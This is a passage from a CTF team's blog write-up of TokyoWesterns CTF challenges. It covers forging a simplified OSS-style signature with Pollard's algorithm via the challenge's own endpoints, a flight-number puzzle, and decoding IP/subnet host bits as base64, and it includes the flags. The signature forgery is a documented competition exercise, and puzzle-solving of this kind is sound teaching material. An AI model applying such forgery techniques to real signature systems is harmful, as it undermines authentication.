+<p>Hence, we can define a $64^2\times64^2$ transition matrix $T$ over $\text{GF}(2)$ from the above definition. Then if we can compute $T^{m}$, we can easily obtain $s_m, s_{m+1}, ..., s_{m+63}$.</p>
+
+<div class="alert warning">
+  <strong>Help.</strong> I personally think it is infeasible to compute the exponentiations since the dimension is large (wouldn&rsquo;t it be $O(m^{2.3737}\cdot\log n)$ to compute $M^n$ for a $m\times m$ matrix?).
+</div>
+  
+
+<p>Since we can efficiently compute $s_m$ given an arbitrary $m$, it would be easy for us to skip unecessary states and compute the flag: <code>FAKEFLAG{THIS_IS_FAKE_FLAG}</code>.</p>
+
+<p>Oops, nope. I mean</p>
+<pre><code>TWCTF{1084cd93186a8ab4110c991a7980aae36d77f2_X0R5h1f7+_15_m0Re_c0mp1ex_th4n_y0u_thought_right?1!!}</code></pre>
+<h2 id="circular-crypto-370-points">circular (Crypto, 370 points)<a hidden class="anchor" aria-hidden="true" href="#circular-crypto-370-points">#</a></h2>
+
+<p>Solved by <em>Mystiz</em>.</p>
+
+<p>There are two endpoints provided, <code>pubkey</code> and <code>verify</code>. The <code>pubkey</code> endpoint returns a fix <code>n</code> and <code>k</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#e6db74">&#34;https://crypto02.chal.ctf.westerns.tokyo/&#34;</span> -X POST --data <span style="color:#e6db74">&#39;{&#34;cmd&#34;:&#34;pubkey&#34;}&#39;</span>
+<span style="color:#75715e"># {&#34;pubkey&#34;:{&#34;n&#34;:&#34;25299...&#34;,&#34;k&#34;:&#34;31019...&#34;}}</span></code></pre></div>
+<p>And one can submit <code>x</code>, <code>y</code> and <code>msg</code> to the <code>verify</code> endpoint. It is verifying a signature in the following way:</p>
+
+<p><span  class="math">\[x^2 + ky^2 \equiv \text{hash}(msg)\ (\text{mod}\ n).\]</span></p>
+
+<p>In particular, you can get the flag when the signature is correct and <code>msg == 'SUNSHINE RHYTHM'</code>. Hence, the objective is to solve the quadratic congruence $x^2 + ky^2 \equiv m\ (\text{mod}\ n)$. This is a simplified version of OSS schemes.</p>
+
+<p>I was not aware of the OSS schemes beforehand. I spent some time deriving the solution by myself but in vain. Eventually, I've gave up deriving everything from nothing and came across to Pollard's algorithm (From <em>An Efficient Solution of the Congruence x<sup>2</sup> + ky<sup>2</sup> = m (mod n)</em> by Pollard and Schnorr). Moreover, the algorithm is described very clearly in <em>An Exposition of Pollard's Algorithm for Quadratic Congruences</em> by Shallit. I have an implementation of Pollard's algorithm following their procedures.</p>
+
+<p>Supplying $k$, $m$ and $n$ to Pollard's algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the <code>verify</code> endpoint would give us the flag - <code>TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}</code>.</p>
+
+<h2 id="birds-misc-41-points">Birds (Misc, 41 points)<a hidden class="anchor" aria-hidden="true" href="#birds-misc-41-points">#</a></h2>
+
+<p>Solved by <em>cire meat pop</em> and <em>Mystiz</em>.</p>
+
+<p>Nothing much is given from the challenge description, there are a multiple lines <code>/^[A-Z]{2}[0-9]{3,4}$/</code>'s.</p>
+<pre><code>BC552
+AC849
+JL106
+PQ448
+JL901
+LH908
+NH2177</code></pre>
+<p>After a bit of Googling, those are flight numbers. What do they mean? Let's see where they depart and arrive:</p>
+
+<table>
+<thead>
+<tr>
+<th>Flight</th>
+<th>Depart from</th>
+<th>Arrive to</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>BC552</td>
+<td>OKA</td>
+<td>NGO</td>
+</tr>
+
+<tr>
+<td>AC849</td>
+<td>LHR</td>
+<td>YYZ</td>
+</tr>
+
+<tr>
+<td>JL106</td>
+<td>ITM</td>
+<td>HND</td>
+</tr>
+
+<tr>
+<td>PQ448</td>
+<td>TBS</td>
+<td>ODS</td>
+</tr>
+
+<tr>
+<td>JL901</td>
+<td>HND</td>
+<td>OKA</td>
+</tr>
+
+<tr>
+<td>LH908</td>
+<td>FRA</td>
+<td>LHR</td>
+</tr>
+
+<tr>
+<td>NH2177</td>
+<td>NRT</td>
+<td>ITM</td>
+</tr>
+</tbody>
+</table>
+
+<p>Hmm... We can see some locations shown more than once. There must be some meaning. Let's connect them.</p>
+<pre><code>NRT -&gt; ITM -&gt; HND -&gt; OKA -&gt; NGO
+FRA -&gt; LHR -&gt; YYZ
+TBS -&gt; ODS</code></pre>
+<p>By taking the first letter from each of them, we get:</p>
+<pre><code>NIHON
+FLY
+TO</code></pre>
+<p>Oh and finally we have the flag: <code>TWCTF{FLYTONIHON}</code>. Unfortunately the finals is online this year... (And we are not qualified, too)</p>
+
+<p><em>Addendum: We did!</em></p>
+
+<h2 id="mask-misc-26-points">mask (Misc, 26 points)<a hidden class="anchor" aria-hidden="true" href="#mask-misc-26-points">#</a></h2>
+
+<p>Solved by <em>harrier</em> and <em>cire meat pop</em>.</p>
+
+<p>There is a list of IP addresses and maybe subnet mask in the challenge description.</p>
+<pre><code>192.168.55.86/255.255.255.0
+192.168.80.198/255.255.255.128
+192.168.1.228/255.255.255.128
+192.168.90.68/255.255.254.0
+192.168.8.214/255.255.255.128
+...</code></pre>
+<p>The list is quite long, we suspect that each IP address is representing a character. After multiple unsuccessful attempts, we found the host identifier for the last row is <code>0b111101</code>, which is <code>=</code> in ASCII... Is it encoded with base64?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;mask.txt&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    s <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+    a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> s:
+        lr <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;/&#39;</span>)
+        l <span style="color:#f92672">=</span> lr[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)
+        r <span style="color:#f92672">=</span> lr[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)
+        a<span style="color:#f92672">+=</span>chr(int(l[<span style="color:#ae81ff">3</span>])<span style="color:#f92672">&amp;</span>(<span style="color:#ae81ff">255</span><span style="color:#f92672">^</span>int(r[<span style="color:#ae81ff">3</span>])))
+    <span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(a))</code></pre></div>
+<p>The output is: <code>TWCTF{Are-you-using-a-mask?}</code></p>
+
+</div>
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://b6a.black/tags/ctf/">ctf</a></li>
+      <li><a href="https://b6a.black/tags/tokyowesterns-ctf/">tokyowesterns-ctf</a></li>
+    </ul>
+    <nav class="paginav">
+      <a class="prev" href="https://b6a.black/posts/2021-02-09-dicectf-liye/">
+        <span class="title">« Prev Page</span>
+        <br>
+        <span>DiceCTF 2021: Lost in your Eyes</span>
+      </a>
+    </nav>
+  </footer>
+</article>
+    </main><footer class="footer">
+    <span>&copy; 2021 <a href="https://b6a.black/">Black Bauhinia</a></span>
+    <span>&middot;</span>
+    <span>Powered by <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a></span>
+    <span>&middot;</span>
+    <span>Theme <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)">
+    <button class="top-link" id="top-link" type="button" accesskey="g">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+            <path d="M12 6H0l6-6z" />
+        </svg>
+    </button>
+</a>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css"
+  integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js"
+  integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js"
+  integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"
+  onload="renderMathInElement(document.body, { delimiters: [{ left: '$$', right: '$$', display: true }, { left: '\\[', right: '\\]', display: true }, { left: '$', right: '$', display: false }, { left: '\\(', right: '\\)', display: false }]})"></script>
+
+
+
+<script defer src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script>
+    window.onload = function () {
+        if (localStorage.getItem("menu-scroll-position")) {
+            document.getElementById('menu').scrollLeft = localStorage.getItem("menu-scroll-position");
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+    function menu_on_scroll() {
+        localStorage.setItem("menu-scroll-position", document.getElementById('menu').scrollLeft);
+    }
+
+</script>
+
+</body>
+
+</html>
